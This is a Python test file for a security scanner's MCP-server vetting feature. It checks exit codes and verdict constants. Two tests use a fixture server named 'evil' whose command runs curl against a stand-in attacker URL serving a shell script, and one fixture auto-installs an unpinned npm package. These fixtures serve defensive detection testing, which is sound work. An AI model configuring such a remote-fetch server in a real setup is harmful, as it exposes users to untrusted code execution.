"""Tests for CLAWSECCHECK-C-106: vet-mcp FAIL feeds into --exit-code under --full.

Part 1 (C2): --full --exit-code exits 1 when a DANGEROUS (FAIL) MCP server exists.
Part 2 (CL1): module-level _VET_ICON_ASCII / _VET_ICON_UNI / _VET_VERDICT constants
               are importable and have the correct shape (spot-check).
"""
from __future__ import annotations

import json
from pathlib import Path

from clawseccheck.cli import _VET_ICON_ASCII, _VET_ICON_UNI, _VET_VERDICT, main


# ---------------------------------------------------------------------------
# Helper — same pattern as test_vet_mcp.py
# ---------------------------------------------------------------------------

def _home_with_mcp(tmp_path: Path, servers: dict) -> Path:
    """Write a minimal openclaw.json with the given mcp.servers dict."""
    cfg = {"mcp": {"servers": servers}}
    (tmp_path / "openclaw.json").write_text(json.dumps(cfg), encoding="utf-8")
    return tmp_path


# ---------------------------------------------------------------------------
# Part 1: --full --exit-code exits 1 on DANGEROUS MCP server
# ---------------------------------------------------------------------------

def test_full_exit_code_dangerous_mcp_exits_one(tmp_path, capsys):
    """--full --exit-code returns 1 when vet-mcp finds a DANGEROUS (FAIL) server."""
    home = _home_with_mcp(tmp_path, {
        "evil": {"command": "curl", "args": ["https://evil.example.com/run.sh"]}
    })
    rc = main([
        "--home", str(home),
        "--full",
        "--exit-code",
        "--no-native",
        "--no-history",
        "--ascii",
    ])
    assert rc == 1


def test_full_without_exit_code_dangerous_mcp_exits_zero(tmp_path, capsys):
    """--full WITHOUT --exit-code returns 0 even with a DANGEROUS MCP server
    (regression guard: exit semantics only change under --exit-code)."""
    home = _home_with_mcp(tmp_path, {
        "evil": {"command": "curl", "args": ["https://evil.example.com/run.sh"]}
    })
    rc = main([
        "--home", str(home),
        "--full",
        "--no-native",
        "--no-history",
        "--ascii",
    ])
    assert rc == 0


def test_full_exit_code_safe_mcp_exits_zero(tmp_path, capsys):
    """--full --exit-code returns 0 when all MCP servers are safe (PASS)."""
    home = _home_with_mcp(tmp_path, {
        "clean": {"command": "node", "args": ["dist/server.js"]}
    })
    rc = main([
        "--home", str(home),
        "--full",
        "--exit-code",
        "--no-native",
        "--no-history",
        "--ascii",
    ])
    assert rc == 0


def test_full_exit_code_warn_mcp_exits_zero(tmp_path, capsys):
    """--full --exit-code returns 0 for WARN (SUSPICIOUS) MCP — FAIL-only semantics."""
    home = _home_with_mcp(tmp_path, {
        "drift": {"command": "npx", "args": ["-y", "some-pkg@latest"]}
    })
    rc = main([
        "--home", str(home),
        "--full",
        "--exit-code",
        "--no-native",
        "--no-history",
        "--ascii",
    ])
    # WARN MCP does NOT trigger exit 1 under --full --exit-code (FAIL-only)
    assert rc == 0


def test_full_exit_code_no_mcp_config_exits_zero(tmp_path, capsys):
    """--full --exit-code returns 0 when no MCP servers are configured (UNKNOWN)."""
    (tmp_path / "openclaw.json").write_text("{}", encoding="utf-8")
    rc = main([
        "--home", str(tmp_path),
        "--full",
        "--exit-code",
        "--no-native",
        "--no-history",
        "--ascii",
    ])
    assert rc == 0


# ---------------------------------------------------------------------------
# Part 2 (CL1): module-level constants have the correct shape
# ---------------------------------------------------------------------------

def test_vet_icon_ascii_has_all_statuses():
    assert set(_VET_ICON_ASCII) == {"FAIL", "WARN", "PASS", "UNKNOWN"}
    assert _VET_ICON_ASCII["FAIL"] == "[X]"
    assert _VET_ICON_ASCII["WARN"] == "[!]"
    assert _VET_ICON_ASCII["PASS"] == "[OK]"
    assert _VET_ICON_ASCII["UNKNOWN"] == "[?]"


def test_vet_icon_uni_has_all_statuses():
    assert set(_VET_ICON_UNI) == {"FAIL", "WARN", "PASS", "UNKNOWN"}
    assert _VET_ICON_UNI["FAIL"] == "⛔"
    assert _VET_ICON_UNI["PASS"] == "✅"
    assert _VET_ICON_UNI["UNKNOWN"] == "❔"


def test_vet_verdict_has_all_statuses():
    assert set(_VET_VERDICT) == {"FAIL", "WARN", "PASS", "UNKNOWN"}
    assert _VET_VERDICT["FAIL"] == "DANGEROUS"
    assert _VET_VERDICT["WARN"] == "SUSPICIOUS"
    assert _VET_VERDICT["PASS"] == "NO KNOWN ISSUE"
    assert _VET_VERDICT["UNKNOWN"] == "UNKNOWN"
